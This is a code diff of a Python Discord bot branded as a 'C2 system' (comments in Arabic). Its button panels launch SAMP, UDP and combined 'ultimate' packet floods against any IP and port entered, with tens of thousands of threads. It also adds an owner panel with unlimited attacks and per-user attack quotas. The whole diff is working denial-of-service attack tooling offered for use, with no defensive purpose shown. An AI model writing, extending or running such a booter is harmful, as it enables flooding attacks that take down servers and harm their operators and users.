-            await interaction.followup.send(f"✅ COMPLETE!\n📦 {packets:,} packets\n⚡ {rate:,.0f} pps\n🚀 {gbps:.2f} Gbps\n💀 {remaining} left", ephemeral=True)
-        modal.on_submit = on_submit
-        await interaction.response.send_modal(modal)
-
-    @discord.ui.button(label="🔥 UDP INFERNO", style=discord.ButtonStyle.primary, row=0, emoji="🔥")
+        if str(interaction.user.id) != self.user_id:
+            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
+            return
+        await interaction.response.send_modal(AttackModal("SAMP", self.user_id))
+    
+    @discord.ui.button(label="📡 UDP ATTACK", style=discord.ButtonStyle.primary, row=0, emoji="📡")
     async def udp_btn(self, interaction: discord.Interaction, button: Button):
-        if not await self.check_limit(interaction): return
-        modal = Modal(title="💀 UDP INFERNO")
-        ip = TextInput(label="🎯 IP", placeholder="YOUR_SERVER_IP", required=True)
-        port = TextInput(label="🔌 PORT", placeholder="7777", required=True)
-        duration = TextInput(label="⏱️ DURATION (1-30s)", placeholder="15", required=True)
-        modal.add_item(ip); modal.add_item(port); modal.add_item(duration)
-        async def on_submit(interaction):
-            await self.decrement_limit(interaction)
-            await interaction.response.send_message(f"🔥 Attacking {ip.value}:{port.value}", ephemeral=True)
-            packets, rate = await tester.udp_attack(ip.value, int(port.value), min(int(duration.value), 30))
-            remaining = USER_ATTACK_LIMITS.get(self.user_id, 0)
-            await interaction.followup.send(f"✅ COMPLETE!\n📦 {packets:,} packets\n⚡ {rate:,.0f} pps\n💀 {remaining} left", ephemeral=True)
-        modal.on_submit = on_submit
-        await interaction.response.send_modal(modal)
-
-    @discord.ui.button(label="💀 ULTIMATE", style=discord.ButtonStyle.danger, row=1, emoji="💀")
+        if str(interaction.user.id) != self.user_id:
+            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
+            return
+        await interaction.response.send_modal(AttackModal("UDP", self.user_id))
+    
+    @discord.ui.button(label="💀 ULTIMATE ATTACK", style=discord.ButtonStyle.danger, row=1, emoji="💀")
     async def ultimate_btn(self, interaction: discord.Interaction, button: Button):
-        if not await self.check_limit(interaction): return
-        modal = Modal(title="💀 ULTIMATE")
-        ip = TextInput(label="🎯 IP", placeholder="YOUR_SERVER_IP", required=True)
-        port = TextInput(label="🔌 PORT", placeholder="7777", required=True)
-        duration = TextInput(label="⏱️ DURATION (1-30s)", placeholder="15", required=True)
-        modal.add_item(ip); modal.add_item(port); modal.add_item(duration)
-        async def on_submit(interaction):
-            await self.decrement_limit(interaction)
-            await interaction.response.send_message(f"💀 Ultimate on {ip.value}:{port.value}", ephemeral=True)
-            packets, rate = await tester.ultimate_attack(ip.value, int(port.value), min(int(duration.value), 30))
-            remaining = USER_ATTACK_LIMITS.get(self.user_id, 0)
-            await interaction.followup.send(f"✅ COMPLETE!\n📦 {packets:,} packets\n⚡ {rate:,.0f} pps\n💀 {remaining} left", ephemeral=True)
-        modal.on_submit = on_submit
-        await interaction.response.send_modal(modal)
-
+        if str(interaction.user.id) != self.user_id:
+            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
+            return
+        await interaction.response.send_modal(AttackModal("ULTIMATE", self.user_id))
+    
     @discord.ui.button(label="📊 MY STATS", style=discord.ButtonStyle.secondary, row=2, emoji="📊")
-    async def mystats_btn(self, interaction: discord.Interaction, button: Button):
-        remaining = USER_ATTACK_LIMITS.get(self.user_id, 0)
+    async def stats_btn(self, interaction: discord.Interaction, button: Button):
+        if str(interaction.user.id) != self.user_id:
+            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
+            return
+        
+        attacks_left = USERS.get(self.user_id, {}).get("attacks_left", 0)
         embed = discord.Embed(title="📊 YOUR STATISTICS", color=0xFFD700)
-        embed.add_field(name="💀 Attacks Left", value=f"`{remaining}`", inline=True)
-        embed.add_field(name="🎯 Your Attacks", value=f"`{tester.stats['total_attacks']}`", inline=True)
-        embed.add_field(name="🏆 Global Peak", value=f"`{tester.stats['peak_speed_pps']:,.0f} pps`", inline=True)
-        embed.add_field(name="🔧 Threads", value=f"`{tester.threads:,}`", inline=True)
-        embed.add_field(name="🎭 Proxies", value=f"`{proxy_manager.count():,}`", inline=True)
+        embed.add_field(name="💀 Attacks Left", value=str(attacks_left), inline=True)
+        embed.add_field(name="🎯 Total Attacks", value=str(tester.stats['total_attacks']), inline=True)
+        embed.add_field(name="🏆 Peak PPS", value=f"{tester.stats['peak_speed_pps']:,.0f}", inline=True)
+        embed.add_field(name="⚡ Thread Limit", value=f"{MAX_THREADS_USER} threads", inline=True)
         await interaction.response.send_message(embed=embed, ephemeral=True)
-
+    
     @discord.ui.button(label="👤 PROFILE", style=discord.ButtonStyle.secondary, row=2, emoji="👤")
     async def profile_btn(self, interaction: discord.Interaction, button: Button):
-        remaining = USER_ATTACK_LIMITS.get(self.user_id, 0)
+        if str(interaction.user.id) != self.user_id:
+            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
+            return
+        
+        attacks_left = USERS.get(self.user_id, {}).get("attacks_left", 0)
         embed = discord.Embed(title=f"👤 {interaction.user.name}'s PROFILE", color=0x00FF00)
         embed.set_thumbnail(url=interaction.user.avatar.url if interaction.user.avatar else None)
         embed.add_field(name="🆔 ID", value=f"`{self.user_id}`", inline=True)
-        embed.add_field(name="💀 Attacks Left", value=f"`{remaining}`", inline=True)
-        embed.add_field(name="✅ Status", value="`Approved`" if self.user_id in APPROVED_USERS else "`Pending`", inline=True)
-        embed.add_field(name="🎭 Proxies", value=f"`{proxy_manager.count():,}`", inline=True)
+        embed.add_field(name="💀 Attacks Left", value=f"`{attacks_left}`", inline=True)
+        embed.add_field(name="👑 Role", value="`User`", inline=True)
         await interaction.response.send_message(embed=embed, ephemeral=True)
-
-    @discord.ui.button(label="⏹️ STOP ALL", style=discord.ButtonStyle.danger, row=2, emoji="⏹️")
+    
+    @discord.ui.button(label="⏹️ STOP ATTACK", style=discord.ButtonStyle.danger, row=2, emoji="⏹️")
     async def stop_btn(self, interaction: discord.Interaction, button: Button):
+        if str(interaction.user.id) != self.user_id:
+            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
+            return
         tester.stop()
         await interaction.response.send_message("⏹️ **ALL ATTACKS STOPPED!**", ephemeral=True)
 
 # ============================================
-# البوت الرئيسي
+# لوحة المالك
 # ============================================
-bot = commands.Bot(command_prefix='!', intents=discord.Intents.default())
+class OwnerPanel(View):
+    def __init__(self, user_id):
+        super().__init__(timeout=None)
+        self.user_id = user_id
+    
+    @discord.ui.button(label="🎮 SAMP (UNLIMITED)", style=discord.ButtonStyle.danger, row=0, emoji="🎮")
+    async def samp_btn(self, interaction: discord.Interaction, button: Button):
+        if str(interaction.user.id) != self.user_id:
+            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
+            return
+        modal = Modal(title="💀 OWNER SAMP ATTACK")
+        ip = TextInput(label="🎯 Target IP", placeholder="Your server IP", required=True)
+        port = TextInput(label="🔌 Port", placeholder="7777", required=True)
+        duration = TextInput(label="⏱️ Duration (seconds)", placeholder="10-60", required=True)
+        threads = TextInput(label="⚡ Threads", placeholder="1000-100000", required=True, default="50000")
+        modal.add_item(ip); modal.add_item(port); modal.add_item(duration); modal.add_item(threads)
+        
+        async def on_submit(interaction):
+            try:
+                ip_val = ip.value
+                port_val = int(port.value)
+                duration_val = min(int(duration.value), 60)
+                threads_val = min(int(threads.value), MAX_THREADS_OWNER)
+            except:
+                await interaction.response.send_message("❌ Invalid input!", ephemeral=True)
+                return
+            
+            await interaction.response.send_message(f"💀 **OWNER ATTACK**\n🎯 {ip_val}:{port_val}\n⚡ Threads: {threads_val}\n⏱️ Duration: {duration_val}s", ephemeral=True)
+            msg = await interaction.followup.send("🚀 Launching attack...", ephemeral=True)
+            packets, rate = await tester.attack(ip_val, port_val, duration_val, threads_val, is_samp=True)
+            await msg.edit(content=f"✅ **ATTACK COMPLETE!**\n📦 Packets: {packets:,}\n⚡ Rate: {rate:,.0f} pps")
+        
+        modal.on_submit = on_submit
+        await interaction.response.send_modal(modal)
+    
+    @discord.ui.button(label="📡 UDP (UNLIMITED)", style=discord.ButtonStyle.primary, row=0, emoji="📡")
+    async def udp_btn(self, interaction: discord.Interaction, button: Button):
+        if str(interaction.user.id) != self.user_id:
+            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
+            return
+        modal = Modal(title="💀 OWNER UDP ATTACK")
+        ip = TextInput(label="🎯 Target IP", placeholder="Your server IP", required=True)
+        port = TextInput(label="🔌 Port", placeholder="7777", required=True)
+        duration = TextInput(label="⏱️ Duration (seconds)", placeholder="10-60", required=True)
+        threads = TextInput(label="⚡ Threads", placeholder="1000-100000", required=True, default="50000")
+        modal.add_item(ip); modal.add_item(port); modal.add_item(duration); modal.add_item(threads)
+        
+        async def on_submit(interaction):
+            try:
+                ip_val = ip.value
+                port_val = int(port.value)
+                duration_val = min(int(duration.value), 60)
+                threads_val = min(int(threads.value), MAX_THREADS_OWNER)
+            except:
+                await interaction.response.send_message("❌ Invalid input!", ephemeral=True)
+                return
+            
+            await interaction.response.send_message(f"🔥 **OWNER UDP ATTACK**\n🎯 {ip_val}:{port_val}\n⚡ Threads: {threads_val}\n⏱️ Duration: {duration_val}s", ephemeral=True)
+            msg = await interaction.followup.send("🚀 Launching attack...", ephemeral=True)
+            packets, rate = await tester.attack(ip_val, port_val, duration_val, threads_val, is_samp=False)
+            await msg.edit(content=f"✅ **ATTACK COMPLETE!**\n📦 Packets: {packets:,}\n⚡ Rate: {rate:,.0f} pps")
+        
+        modal.on_submit = on_submit
+        await interaction.response.send_modal(modal)
+    
+    @discord.ui.button(label="💀 ULTIMATE (UNLIMITED)", style=discord.ButtonStyle.danger, row=1, emoji="💀")
+    async def ultimate_btn(self, interaction: discord.Interaction, button: Button):
+        if str(interaction.user.id) != self.user_id:
+            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
+            return
+        modal = Modal(title="💀 OWNER ULTIMATE ATTACK")
+        ip = TextInput(label="🎯 Target IP", placeholder="Your server IP", required=True)
+        port = TextInput(label="🔌 Port", placeholder="7777", required=True)
+        duration = TextInput(label="⏱️ Duration (seconds)", placeholder="10-60", required=True)
+        threads = TextInput(label="⚡ Threads", placeholder="1000-100000", required=True, default="50000")
+        modal.add_item(ip); modal.add_item(port); modal.add_item(duration); modal.add_item(threads)
+        
+        async def on_submit(interaction):
+            try:
+                ip_val = ip.value
+                port_val = int(port.value)
+                duration_val = min(int(duration.value), 60)
+                threads_val = min(int(threads.value), MAX_THREADS_OWNER)
+            except:
+                await interaction.response.send_message("❌ Invalid input!", ephemeral=True)
+                return
+            
+            await interaction.response.send_message(f"💀 **OWNER ULTIMATE ATTACK**\n🎯 {ip_val}:{port_val}\n⚡ Threads: {threads_val}\n⏱️ Duration: {duration_val}s", ephemeral=True)
+            msg = await interaction.followup.send("🚀 Launching ultimate attack...", ephemeral=True)
+            packets1, rate1 = await tester.attack(ip_val, port_val, duration_val, threads_val, is_samp=True)
+            packets2, rate2 = await tester.attack(ip_val, port_val, duration_val, threads_val, is_samp=False)
+            packets = packets1 + packets2
+            rate = rate1 + rate2
+            await msg.edit(content=f"✅ **ULTIMATE COMPLETE!**\n📦 Packets: {packets:,}\n⚡ Rate: {rate:,.0f} pps")
+        
+        modal.on_submit = on_submit
+        await interaction.response.send_modal(modal)
+    
+    @discord.ui.button(label="📋 PENDING REQUESTS", style=discord.ButtonStyle.secondary, row=2, emoji="📋")
+    async def pending_btn(self, interaction: discord.Interaction, button: Button):
+        if str(interaction.user.id) != self.user_id:
+            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
+            return
+        
+        if not PENDING_USERS:
+            await interaction.response.send_message("📭 No pending requests!", ephemeral=True)
+            return
+        
+        for uid in PENDING_USERS:
+            try:
+                user = await interaction.client.fetch_user(int(uid))
+                embed = discord.Embed(title="📋 PENDING REQUEST", color=0xFF6600)
+                embed.add_field(name="User", value=f"{user.name} (`{uid}`)", inline=True)
+                await interaction.response.send(embed=embed, view=OwnerApproveView(uid, user.name), ephemeral=True)
+                await asyncio.sleep(0.5)
+            except:
+                pass
+    
+    @discord.ui.button(label="👥 ALL USERS", style=discord.ButtonStyle.secondary, row=2, emoji="👥")
+    async def users_btn(self, interaction: discord.Interaction, button: Button):
+        if str(interaction.user.id) != self.user_id:
+            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
+            return
+        
+        if not USERS:
+            await interaction.response.send_message("👥 No users yet!", ephemeral=True)
+            return
+        
+        users_list = ""
+        for uid, info in USERS.items():
+            attacks = "∞" if info.get("role") == "owner" else info.get("attacks_left", 0)
+            users_list += f"• `{uid}` - {attacks} attacks\n"
+        
+        embed = discord.Embed(title="👥 REGISTERED USERS", description=users_list, color=0x00BFFF)
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+    
+    @discord.ui.button(label="📊 STATS", style=discord.ButtonStyle.secondary, row=2, emoji="📊")
+    async def stats_btn(self, interaction: discord.Interaction, button: Button):
+        if str(interaction.user.id) != self.user_id:
+            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
+            return
+        
+        embed = discord.Embed(title="📊 SYSTEM STATISTICS", color=0xFFD700)
+        embed.add_field(name="📦 Total Packets", value=f"{tester.stats['total_packets']:,}", inline=True)
+        embed.add_field(name="🎯 Total Attacks", value=str(tester.stats['total_attacks']), inline=True)
+        embed.add_field(name="🏆 Peak PPS", value=f"{tester.stats['peak_speed_pps']:,.0f}", inline=True)
+        embed.add_field(name="👥 Registered Users", value=str(len(USERS)), inline=True)
+        embed.add_field(name="📝 Pending Users", value=str(len(PENDING_USERS)), inline=True)
+        embed.add_field(name="⚡ Max Threads", value=f"{MAX_THREADS_OWNER:,}", inline=True)
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+    
+    @discord.ui.button(label="⚙️ GIVE ATTACKS", style=discord.ButtonStyle.secondary, row=3, emoji="⚙️")
+    async def give_btn(self, interaction: discord.Interaction, button: Button):
+        if str(interaction.user.id) != self.user_id:
+            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
+            return
+        
+        modal = Modal(title="⚙️ GIVE ATTACKS TO USER")
+        user_id_input = TextInput(label="🆓 User ID", placeholder="Enter user ID", required=True)
+        amount_input = TextInput(label="🎯 Number of attacks", placeholder="Enter number", required=True)
+        modal.add_item(user_id_input)
+        modal.add_item(amount_input)
+        
+        async def on_submit(interaction):
+            try:
+                target_id = user_id_input.value
+                amount = int(amount_input.value)
+                
+                if target_id not in USERS:
+                    USERS[target_id] = {"attacks_left": amount, "role": "user"}
+                else:
+                    USERS[target_id]["attacks_left"] = USERS[target_id].get("attacks_left", 0) + amount
+                save_data()
+                
+                await interaction.response.send_message(f"✅ Added {amount} attacks to `{target_id}`!", ephemeral=True)
+                
+                try:
+                    user = await interaction.client.fetch_user(int(target_id))
+                    if user:
+                        await user.send(f"🎁 Admin gave you **{amount}** additional attacks!")
+                except:
+                    pass
+            except:
+                await interaction.response.send_message("❌ Invalid input!", ephemeral=True)
+        
+        modal.on_submit = on_submit
+        await interaction.response.send_modal(modal)
+    
+    @discord.ui.button(label="⏹️ STOP", style=discord.ButtonStyle.danger, row=3, emoji="⏹️")
+    async def stop_btn(self, interaction: discord.Interaction, button: Button):
+        if str(interaction.user.id) != self.user_id:
+            await interaction.response.send_message("❌ Unauthorized!", ephemeral=True)
+            return
+        tester.stop()
+        await interaction.response.send_message("⏹️ **ALL ATTACKS STOPPED!**", ephemeral=True)
+
+# ============================================
+# البوت - بدون أي أوامر
+# ============================================
+intents = discord.Intents.default()
+intents.message_content = True
+bot = commands.Bot(command_prefix='!', intents=intents)
+
+# إخفاء الأوامر الافتراضية
+bot.remove_command('help')
 
 @bot.event
 async def on_ready():
-    print(LOGO)
     print(f"""
-╔══════════════════════════════════════════════════════════════════════════════════════╗
-║                    ✅ LI ZANDYA C2 SYSTEM X5000 ONLINE! ✅                           ║╠══════════════════════════════════════════════════════════════════════════════════════╣
-║ 🤖 Bot: {bot.user}                                                                   ║
-║ 🔥 Threads: {tester.threads:,}                                                       ║
-║ 🎭 Proxies: {proxy_manager.count():,}                                               ║
-║ 💾 RAM: {TOTAL_RAM} GB ({AVAILABLE_RAM} GB Free)                                     ║
-║ 👑 Owner: {OWNER_ID if OWNER_ID else 'Not set - DM me to become owner!'}            ║
-║ 👥 Approved: {len(APPROVED_USERS)} | 📝 Pending: {len(PENDING_USERS)}               ║
-╠══════════════════════════════════════════════════════════════════════════════════════╣
-║ 💀 Commands:                                                                         ║
-║   !login     - Login to system                                                       ║
-║   !register  - Request access (send in DM)                                           ║
-║   !von       - Open main panel                                                       ║
-║   !admin     - Open admin panel (owner only)                                         ║
-║   !top       - Show top users                                                        ║
-╚══════════════════════════════════════════════════════════════════════════════════════╝
+╔══════════════════════════════════════════════════════════════╗
+║         LI ZANDYA C2 SYSTEM ONLINE!                         ║
+╠══════════════════════════════════════════════════════════════╣
+║ 🤖 Bot: {bot.user}                                           ║
+║ 💾 RAM: {TOTAL_RAM} GB                                       ║
+║ 👑 Owner: {OWNER_ID if OWNER_ID else 'Not set'}             ║
+║ 👥 Users: {len(USERS)}                                      ║
+║ 📝 Pending: {len(PENDING_USERS)}                            ║
+╠══════════════════════════════════════════════════════════════╣
+║ 💀 First person to DM this bot becomes OWNER!               ║
+║ 🔥 ALL CONTROLS WITH BUTTONS - NO COMMANDS                  ║
+╚══════════════════════════════════════════════════════════════╝
     """)
-    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="!von | X5000 | Full Buttons"))
 
 @bot.event
 async def on_message(message):
@@ -706,91 +645,40 @@ async def on_message(message):
     if message.author.bot:
         return
     
-    await bot.process_commands(message)
-    
-    # أول شخص يرسل رسالة خاصة يصبح مالك
+    # أول شخص يرسل DM يصبح مالك
     if isinstance(message.channel, discord.DMChannel) and not OWNER_ID:
         OWNER_ID = str(message.author.id)
+        USERS[OWNER_ID] = {"attacks_left": -1, "role": "owner"}
         save_data()
         
-        embed = discord.Embed(title="👑 YOU ARE NOW THE OWNER!", color=0x00FF00)
-        embed.add_field(name="Welcome", value="You have been registered as the owner!", inline=False)
-        embed.add_field(name="Commands", value="Type `!admin` to open admin panel", inline=False)
-        await message.channel.send(embed=embed)
-        
-        print(f"✅ Owner set: {message.author.name} ({OWNER_ID})")
-
-@bot.command()
-async def login(ctx):
-    await ctx.send("🔐 **C2 SYSTEM LOGIN**", view=LoginModal())
-
-@bot.command()
-async def register(ctx):
-    if isinstance(ctx.channel, discord.DMChannel):
-        await ctx.send("📝 **REGISTRATION FORM**", view=RegisterModal())
-    else:
-        await ctx.send("❌ Please send `!register` in private message (DM)!")
-
-@bot.command()
-async def von(ctx):
-    user_id = str(ctx.author.id)
-    
-    if user_id in BANNED_USERS:
-        await ctx.send("🔨 You are banned from this system!")
+        embed = discord.Embed(title="👑 **YOU ARE NOW THE OWNER!**", color=0x00FF00)
+        embed.add_field(name="Welcome", value="You have unlimited attacks!", inline=False)
+        await message.channel.send(embed=embed, view=OwnerPanel(OWNER_ID))
+        print(f"✅ Owner set: {message.author.name}")
         return
     
-    if user_id not in APPROVED_USERS:
-        await ctx.send("❌ Not approved! Send `!register` in DM.")
-        return
-    
-    if not tester.authenticated:
-        await ctx.send("❌ Please `!login` first!")
-        return
-    
-    remaining = USER_ATTACK_LIMITS.get(user_id, 0)
-    embed = discord.Embed(
-        title="💀 LI ZANDYA C2 PANEL X5000 💀",
-        description=f"```🔥 {CPU_CORES} Cores | {tester.threads:,} Threads\n🎭 {proxy_manager.count():,} Proxies\n💾 {TOTAL_RAM} GB RAM\n🏆 {tester.stats['peak_speed_pps']:,.0f} pps peak\n💀 {remaining} attacks left```",
-        color=0xFF0000
-    )
-    await ctx.send(embed=embed, view=MainPanel(user_id))
-
-@bot.command()
-async def admin(ctx):
-    if str(ctx.author.id) != OWNER_ID:
-        await ctx.send("❌ Only the owner can use this command!")
-        return
-    
-    embed = discord.Embed(title="👑 ADMIN CONTROL PANEL", color=0xFF6600)
-    embed.add_field(name="📋 PENDING", value="View pending registration requests", inline=True)
-    embed.add_field(name="👥 USERS", value="List all approved users", inline=True)
-    embed.add_field(name="📊 STATS", value="View system statistics", inline=True)
-    await ctx.send(embed=embed, view=AdminPanel())
-
-@bot.command()
-async def top(ctx):
-    if not APPROVED_USERS:
-        await ctx.send("No users yet!")
-        return
-    
-    user_attacks = []
-    for uid in APPROVED_USERS:
-        user_attacks.append((uid, USER_ATTACK_LIMITS.get(uid, 0)))
-    user_attacks.sort(key=lambda x: x[1], reverse=True)
-    
-    top_list = ""
-    for i, (uid, attacks) in enumerate(user_attacks[:10], 1):
-        top_list += f"{i}. `{uid[:10]}...` - {attacks} attacks left\n"
-    
-    embed = discord.Embed(title="🏆 TOP USERS", description=top_list, color=0xFFD700)
-    embed.set_footer(text=f"Total users: {len(APPROVED_USERS)}")
-    await ctx.send(embed=embed)
+    # للرسائل الخاصة - عرض أزرار التسجيل والدخول
+    if isinstance(message.channel, discord.DMChannel):
+        if str(message.author.id) == OWNER_ID:
+            # المالك يظهر له لوحة المالك
+            await message.channel.send("👑 **OWNER CONTROL PANEL**", view=OwnerPanel(OWNER_ID))
+        elif str(message.author.id) in USERS:
+            # المستخدم المسجل يظهر له لوحة الهجوم
+            await message.channel.send("💀 **ATTACK PANEL**", view=AttackPanel(str(message.author.id)))
+        else:
+            # مستخدم جديد - عرض أزرار التسجيل والدخول
+            view = View()
+            view.add_item(RegisterView().children[0])
+            view.add_item(LoginView().children[0])
+            await message.channel.send("🔐 **WELCOME TO C2 SYSTEM**\nChoose an option:", view=view)
 
 if __name__ == "__main__":
-    print("🚀 Starting LI ZANDYA C2 SYSTEM X5000...")
-    print("💀 100,000 Threads | Full Buttons System")
-    print(f"🎭 {proxy_manager.count():,} Proxies Loaded")
-    print("="*70)
-    print("💀 First person to DM this bot becomes OWNER!")
-    print("="*70)
+    TOKEN = input("🔑 Enter your Discord Bot Token: ").strip()
+    if not TOKEN:
+        print("❌ No token!")
+        exit(1)
+    
+    print("🚀 Starting LI ZANDYA C2 SYSTEM...")
+    print("💀 First person to DM becomes OWNER")
+    print("🔥 ALL CONTROLS WITH BUTTONS - NO COMMANDS")
     bot.run(TOKEN)
